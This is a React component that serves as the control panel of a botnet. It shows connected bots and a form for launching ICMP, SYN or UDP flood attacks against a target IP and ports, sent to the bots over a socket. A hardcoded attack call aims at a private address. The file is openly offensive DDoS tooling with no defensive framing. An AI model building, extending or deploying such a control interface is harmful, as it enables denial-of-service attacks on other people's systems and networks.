import React, { useContext, useEffect, useState } from "react";
import {
  Button,
  Modal,
  Typography,
  Divider,
  Empty,
  Row,
  Form,
  Input,
  Col,
  Select,
  Switch,
  Space,
  Alert,
  message,
  Popconfirm,
  Progress,
  InputNumber,
  Tag,
  Tabs,
  Card,
} from "antd";
import { RightCircleOutlined } from "@ant-design/icons";

import { SocketContext } from "../Context/Context";
import { AttackType } from "../constants";
const { TabPane } = Tabs;
const { Option } = Select;
const { Meta } = Card;
export default function Tabbar() {
  const { connection, botsList } = useContext(SocketContext);

  const { socket } = connection;
  const [progress, setProgress] = useState(100);
  const [totalPacketsSent, setTotalPacketsSent] = useState(0);
  const [leSelectedAttackType, setLeSelectedAttackType] = useState(
    AttackType.syn
  );
  const formItemLayout = {
    labelCol: {
      span: "auto",
    },
    wrapperCol: {
      span: 50,
    },
  };
  const validateMessages = {
    required: "",
  };

  useEffect(() => {
    if (socket != null) {
      const on_progress_update = (data) => {
        const { progress, total_packets_sent } = data;
        setProgress(progress);
        setTotalPacketsSent(total_packets_sent);
        console.log("====================================");
        console.log(botsList);
        console.log("====================================");
      };

      socket.on("on_progress_update", on_progress_update);

      return () => {
        socket.off("on_progress_update", on_progress_update);
        // socket.off('deleteMessage', deleteMessageListener);
      };
    }
  }, [socket]);
  const startAnAttack = (lateParams) => {
    if (socket == null) return;
    let no_of_packets = 400;
    let target_ip = "192.168.43.190";
    let dport = 80;
    let sport = 80;
    let attackType = AttackType.icmp;
    socket.emit("on_attack_requested", {
      no_of_packets,
      target_ip,
      dport,
      sport,
      attackType,
    });
  };
  return (
    <>
      <Row
        style={{
          marginBottom: "10px",
          paddingTop: "5px",
          paddingBottom: "5px",
        }}
      >
        <span style={{ marginRight: "5px" }}>Botnet status :</span>
        <Tag color={botsList.length == 0 ? "red" : "limegreen"}>
          {botsList.length == 0 ? "Unavailable" : "Active"}
        </Tag>
      </Row>
      <Tabs defaultActiveKey="1" type="card">
        <TabPane tab="Botnet" key="2" style={{ overflowY: "auto",paddingTop:"5px",paddingBottom:"15px" }}>
          {botsList.length > 0 ? (
            botsList.map((e) => {
              return (
                <Card
                  key={e.id}
                  size="small"
                  hoverable
                  style={{ width: 240 }}
                  cover={
                    <img
                      alt="Logo"
                      src="https://storage.googleapis.com/webdesignledger.pub.network/WDL/6f050e39-windows_10_logoblue.svg-copy_windows.jpg"
                    />
                  }
                >
                  <Meta title={e.name} />
                  <div style={{ marginTop: "10px" }}>
                    <div>{`ID - ${e.id}`}</div>
                    <div>{`Version - ${e.version}`}</div>
                  </div>
                </Card>
              );
            })
          ) : (
            <p style={{ color: "grey" }}>No bots are alive</p>
          )}
        </TabPane>
        <TabPane tab="Attack" key="1">
          <div>
            <Row
              style={{ width: "100%", marginTop: "5px", marginBottom: "5px+" }}
            ></Row>
            {progress < 100 ? (
              <div style={{ marginRight: 10 }}>
                <Progress
                  strokeColor={{
                    "0%": "#108ee9",
                    "100%": "#87d068",
                  }}
                  status="active"
                  percent={progress}
                />
                <div>{`Packets sent: ${totalPacketsSent}`}</div>
              </div>
            ) : null}
            <Form
              {...formItemLayout}
              layout="horizontal"
              autoComplete="off"
              validateMessages={validateMessages}
              initialValues={{
                attackType: AttackType.syn,
              }}
              onFinish={(data) => {
                socket.emit("on_attack_requested", data);
              }}
            >
              <Row justify="start">
                <Space direction="horizontal" size={"middle"}>
                  <Form.Item
                    name="attackType"
                    label="Attack Type"
                    rules={[{ required: true }]}
                  >
                    <Select placeholder="Select an attack type">
                      <Option value={AttackType.icmp}>ICMP Flood</Option>
                      <Option value={AttackType.syn}>SYN Flood</Option>
                      <Option value={AttackType.udp}>UDP Flood</Option>
                    </Select>
                  </Form.Item>
                  <Form.Item
                    label="No of packets"
                    name="no_of_packets"
                    rules={[{ required: true }]}
                  >
                    <InputNumber min={1} />
                  </Form.Item>
                  <Form.Item
                    label="Target IP"
                    name="target_ip"
                    rules={[{ required: true }]}
                  >
                    <Input placeholder="192.168.1.1" />
                  </Form.Item>
                  <Form.Item
                    noStyle
                    shouldUpdate={(prevValues, currentValues) =>
                      prevValues.attackType !== currentValues.attackType
                    }
                  >
                    {({ getFieldValue }) =>
                      getFieldValue("attackType") === AttackType.syn ||
                      getFieldValue("attackType") === AttackType.udp ? (
                        <Form.Item
                          label="Source Port"
                          name="sport"
                          rules={[{ required: true }]}
                        >
                          <InputNumber min={0} max={65535} />
                        </Form.Item>
                      ) : null
                    }
                  </Form.Item>
                  <Form.Item
                    noStyle
                    shouldUpdate={(prevValues, currentValues) =>
                      prevValues.attackType !== currentValues.attackType
                    }
                  >
                    {({ getFieldValue }) =>
                      getFieldValue("attackType") === AttackType.syn ||
                      getFieldValue("attackType") === AttackType.udp ? (
                        <Form.Item
                          label="Destination Port"
                          name="dport"
                          rules={[{ required: true }]}
                        >
                          <InputNumber min={0} max={65535} />
                        </Form.Item>
                      ) : null
                    }
                  </Form.Item>
                </Space>
              </Row>
              <Row>
                <Form.Item>
                  <Button
                    type="primary"
                    htmlType="submit"
                    icon={<RightCircleOutlined />}
                    disabled={botsList.length == 0}
                  >
                    Commence attack
                  </Button>
                </Form.Item>
              </Row>
            </Form>
          </div>
        </TabPane>
      </Tabs>
    </>
  );
}
